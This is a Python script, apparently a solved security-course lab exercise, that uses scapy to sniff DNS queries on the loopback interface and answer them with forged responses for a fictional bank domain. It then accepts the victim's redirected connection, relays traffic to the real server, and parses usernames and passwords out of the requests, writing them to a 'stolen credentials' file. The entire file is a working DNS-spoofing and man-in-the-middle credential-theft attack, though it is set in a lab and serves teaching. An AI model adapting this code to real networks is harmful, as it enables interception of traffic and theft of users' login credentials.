import os
import argparse
import socket
from scapy.all import *

conf.L3socket = L3RawSocket
WEB_PORT = 8000
BUFFER_SIZE = 4096
HOSTNAME = "LetumiBank.com"


def resolve_hostname(hostname):
	# IP address of HOSTNAME. Used to forward tcp connection.
	# Normally obtained via DNS lookup.
	return "127.1.1.1"


def log_credentials(username, password):
	# Write stolen credentials out to file.
	# Do not change this.
	with open("lib/StolenCreds.txt", "wb") as fd:
		fd.write(str.encode("Stolen credentials: username=" + username + " password=" + password))


def check_credentials(client_data):
	# TODO: Take a block of client data and search for username/password credentials.
	# If found, log the credentials to the system by calling log_credentials().
	client_data_str = client_data.decode('utf-8') 
	if "username" in client_data_str or "password" in client_data_str:
		splitted_data = client_data_str.split("'")
		log_credentials(splitted_data[1], splitted_data[3])


def handle_tcp_forwarding(client_socket, client_ip, hostname):
	# Continuously intercept new connections from the client
	# and initiate a connection with the host in order to forward data

	while True:

		# TODO: accept a new connection from the client on client_socket and
		# create a new socket to connect to the actual host associated with hostname.
		client_accept_socket, client_address = client_socket.accept()
		
		host_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		host_socket.connect((resolve_hostname(hostname), WEB_PORT))


		# TODO: read data from client socket, check for credentials, and forward along to host socket.
		data_received = client_accept_socket.recv(BUFFER_SIZE)
		check_credentials(data_received)
		host_socket.send(data_received)

		# Check for POST to '/post_logout' and exit after that request has completed.
		host_response = host_socket.recv(BUFFER_SIZE)

		client_accept_socket.send(host_response) # send it to the client 
		host_socket.close()						 # close the socket with the web  

		data_received_str = data_received.decode('utf-8') 
		if "POST" in data_received_str and "/post_logout" in data_received_str:
			client_socket.close()
			exit(0)


def dns_callback(packet, extra_args):
	# TODO: Write callback function for handling DNS packets.
	# Sends a spoofed DNS response for a query to HOSTNAME and calls handle_tcp_forwarding() after successful spoof.
	if IP in packet:
		if packet.haslayer(DNS) == True:
			if packet.getlayer(DNS).qr == 0:
				
				modified_packet = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                 				  UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                				  DNS(qd=packet[DNS].qd, id=packet[DNS].id, \
                     				an=DNSRR(rrname=packet.getlayer(DNS).qd.qname, rdata=extra_args[1]), \
                     				qr=1, aa=1)
				send(modified_packet)
				handle_tcp_forwarding(extra_args[0], extra_args[1], HOSTNAME)


def sniff_and_spoof(source_ip):
	victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	victim_socket.bind((source_ip, WEB_PORT))
	victim_socket.listen()
	
	def sniff_dns():
		sniff(prn=lambda packet: callback(packet, (victim_socket, source_ip)), iface="lo")

	def callback(packet, extra_args):
		dns_callback(packet, extra_args)

	while True:
		sniff_dns()
		
	victim_socket.close()


def main():
	parser = argparse.ArgumentParser(description='Attacker who spoofs dns packet and hijacks connection')
	parser.add_argument('--source_ip', nargs='?', const=1, default="127.0.0.3", help='ip of the attacker')
	args = parser.parse_args()

	sniff_and_spoof(args.source_ip)


if __name__ == "__main__":
	# Change working directory to script's dir.
	# Do not change this.
	abspath = os.path.abspath(__file__)
	dirname = os.path.dirname(abspath)
	os.chdir(dirname)
	main()
